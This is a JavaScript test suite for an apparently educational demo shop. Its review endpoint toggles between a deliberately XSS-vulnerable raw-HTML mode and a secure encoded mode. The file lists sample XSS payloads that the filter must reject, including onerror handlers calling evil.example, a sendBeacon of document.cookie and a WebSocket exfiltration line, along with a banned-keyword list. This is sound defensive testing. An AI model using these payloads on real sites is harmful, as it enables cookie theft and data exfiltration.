// XSS module tests — the SAME NovaCart review endpoint must hand the
// controlled payload to the HTML sink when the vulnerability is enabled,
// and deliver it as encoded text when secured. Guard behavior is preserved.
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { boot, DEMO_XSS_PAYLOAD } from './helpers.js';

let ctx;

before(async () => { ctx = await boot(); });
after(async () => { ctx.close(); });

async function setXss(state) {
  const r = await ctx.api('/security/xss', { method: 'POST', body: { state } });
  assert.equal(r.status, 200);
}

describe('XSS — review input filter (always active)', () => {
  test('sanctioned local demo payload is accepted', async () => {
    const { status, data } = await ctx.api('/store/products/1/reviews', {
      method: 'POST',
      body: { author: 'Presenter', content: DEMO_XSS_PAYLOAD, rating: 5 },
    });
    assert.equal(status, 201);
    assert.equal(data.review.content, DEMO_XSS_PAYLOAD);
  });

  test('payloads referencing external targets are rejected', async () => {
    const bad = [
      '<img src=x onerror="fetch(\'http://evil.example\')">',
      '<img src=http://evil.example/x.png onerror=alert(1)>',
      '<script>new WebSocket("ws://evil.example")</script>',
      '<img src=x onerror="location=\'http://evil.example\'">',
      '<img src=x onerror="navigator.sendBeacon(\'http://x\',document.cookie)">',
      '<img src=x onerror="localStorage.setItem(\'x\',\'y\')">',
    ];
    for (const content of bad) {
      const { status, data } = await ctx.api('/store/products/1/reviews', {
        method: 'POST',
        body: { author: 'p', content },
      });
      assert.equal(status, 400, `should reject: ${content}`);
      assert.equal(data.error, 'review_blocked');
    }
  });

  test('the sanctioned payload itself contains no network/storage/cookie calls', () => {
    for (const banned of ['fetch(', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'document.cookie', 'localStorage', 'http://', 'https://']) {
      assert.ok(!DEMO_XSS_PAYLOAD.includes(banned), `payload must not contain ${banned}`);
    }
  });
});

describe('XSS — vulnerable configuration (raw HTML contract)', () => {
  before(async () => { await setXss('vulnerable'); });

  test('reviews are delivered with raw HTML for the browser sink', async () => {
    const { data } = await ctx.api('/store/products/1/reviews');
    assert.equal(data.rendering, 'raw-html');
    for (const r of data.reviews) {
      assert.equal(r.html, r.content, 'raw content handed to the sink (educational)');
    }
    const demo = data.reviews.find((r) => r.content === DEMO_XSS_PAYLOAD);
    assert.ok(demo, 'demo review is present');
  });
});

describe('XSS — secure configuration (encoded text contract)', () => {
  before(async () => { await setXss('secure'); });

  test('the exact same review now renders as inert text', async () => {
    const { data } = await ctx.api('/store/products/1/reviews');
    assert.equal(data.rendering, 'encoded-text');
    for (const r of data.reviews) {
      assert.equal(r.html, null, 'no raw HTML delivered in secure configuration');
      assert.ok(typeof r.text === 'string');
    }
    const demo = data.reviews.find((r) => r.content === DEMO_XSS_PAYLOAD);
    assert.ok(demo, 'same review, same input');
    assert.ok(!demo.text.includes('<img'), 'payload is encoded — nothing executable remains');
  });

  test('new reviews are stored and returned encoded', async () => {
    const { status, data } = await ctx.api('/store/products/2/reviews', {
      method: 'POST',
      body: { author: 'Tester', content: 'Great sound, comfortable fit.', rating: 4 },
    });
    assert.equal(status, 201);
    assert.equal(data.review.html, null);
    assert.equal(data.review.rating, 4);
  });
});
